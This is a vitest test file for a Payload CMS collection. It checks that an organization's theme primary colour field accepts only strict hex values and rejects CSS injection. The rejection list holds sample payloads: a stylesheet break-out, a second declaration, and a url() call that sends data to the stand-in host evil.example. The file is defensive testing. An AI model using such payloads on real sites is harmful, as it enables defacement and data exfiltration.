import { describe, expect, it } from 'vitest'

import { Organizations } from '../collections/Organizations'

/**
 * T012 / FR-019, CLR-004 — the **first** of the two hex checkpoints.
 *
 * ── Why a second checkpoint deserves its own test ───────────────────────────────────────
 *
 * `themeStyle()` (checkpoint two, `lib/theme.ts`) already refuses a malformed colour, so it
 * is tempting to read this field validator as belt-and-braces and test it loosely. That
 * inverts the reason CLR-004 exists: an organization admin writes this value through the
 * admin panel *and* the REST API writes the same field, so the value is hostile input at
 * rest. Feature 000 measured what a single layer is worth — mutating any one of three
 * tenancy layers there left the harness green. A checkpoint nobody asserts is a checkpoint
 * that can be deleted without a failing test.
 *
 * ── Why the validator is reached through the config, not exported separately ────────────
 *
 * What protects the database is the function Payload actually calls. Exporting the predicate
 * and testing it in isolation would pass even if the `validate` key were dropped from the
 * field — the exact regression this test exists to catch. So the test walks the collection
 * the way Payload does: group `theme` → field `primaryColor` → its `validate`.
 */

type FieldWithName = { name?: string; type?: string; fields?: FieldWithName[] }
type Validator = (value: unknown, options: unknown) => unknown

const findField = (fields: FieldWithName[] | undefined, name: string): FieldWithName => {
  const field = fields?.find((candidate) => candidate.name === name)
  if (!field) throw new Error(`Organizations has no field named "${name}"`)
  return field
}

const themeGroup = findField(Organizations.fields as FieldWithName[], 'theme')
const primaryColor = findField(themeGroup.fields, 'primaryColor')

const validate = (value: unknown) => {
  const fn = (primaryColor as { validate?: Validator }).validate
  if (typeof fn !== 'function') {
    throw new Error(
      `theme.primaryColor carries no validate (CLR-004 checkpoint one is missing); ` +
        `field is ${JSON.stringify(primaryColor)}`,
    )
  }
  return fn(value, {})
}

describe('theme.primaryColor accepts only a strict hex colour', () => {
  it.each(['#EE9DC4', '#3760AA', '#abc', '#ABC', '#0f0f0f'])('accepts %s', (value) => {
    expect(validate(value), `a legitimate hex colour was rejected: ${value}`).toBe(true)
  })

  /**
   * The field is optional, and every organization created before this feature has no theme
   * at all. Payload runs `validate` on absent optional values too, so a validator that only
   * knew how to say "not a hex" would make every existing record unsaveable — a migration
   * disguised as a validation. The task says config, not schema, and this is the assertion
   * that keeps it that way.
   */
  it.each([
    { label: 'undefined (no colour chosen)', value: undefined },
    { label: 'null (cleared in the admin panel)', value: null },
    { label: 'an empty string', value: '' },
  ])('accepts $label — the field is optional', ({ value }) => {
    expect(validate(value), 'an optional, unset colour was treated as invalid').toBe(true)
  })
})

describe('theme.primaryColor rejects everything CSS would otherwise swallow', () => {
  /**
   * The first three are SC-011's payloads. The rest are values CSS itself accepts — which is
   * the point of a *narrow* shape: `red` is harmless today, but a validator loose enough to
   * pass a bare keyword is one `rgb(var(--x))` away from passing a function call.
   */
  const REJECTED = [
    { label: 'a stylesheet break-out', value: 'red;} body{display:none' },
    { label: 'a second declaration', value: 'red; display:none' },
    { label: 'a url() exfiltration', value: '#fff;background:url(https://evil.example/x)' },
    { label: 'a CSS keyword', value: 'red' },
    { label: 'an rgb() call', value: 'rgb(255,0,0)' },
    { label: 'a var() reference', value: 'var(--color-navy)' },
    { label: 'a hex missing its hash', value: 'EE9DC4' },
    { label: 'a 5-digit hex', value: '#EE9DC' },
    { label: 'an 8-digit hex with alpha', value: '#EE9DC4AA' },
    { label: 'non-hex digits', value: '#ZZZZZZ' },
    { label: 'a padded hex', value: ' #EE9DC4 ' },
    { label: 'a trailing semicolon', value: '#EE9DC4;' },
    { label: 'a number', value: 16711680 },
    { label: 'an object', value: { primaryColor: '#EE9DC4' } },
  ]

  it.each(REJECTED)('rejects $label', ({ value }) => {
    const result = validate(value)
    expect(result, `an untrusted value was accepted: ${JSON.stringify(value)}`).not.toBe(true)
    expect(typeof result, 'a rejection must be a message Payload can show the admin').toBe(
      'string',
    )
  })

  /**
   * An error you cannot reproduce from its own message is one nobody can fix — and this
   * message is read by a lab admin in the panel, not by a developer with the record in hand.
   */
  it('names the offending value in the rejection message', () => {
    const result = validate('red;} body{display:none')
    expect(String(result)).toContain('red;} body{display:none')
  })
})
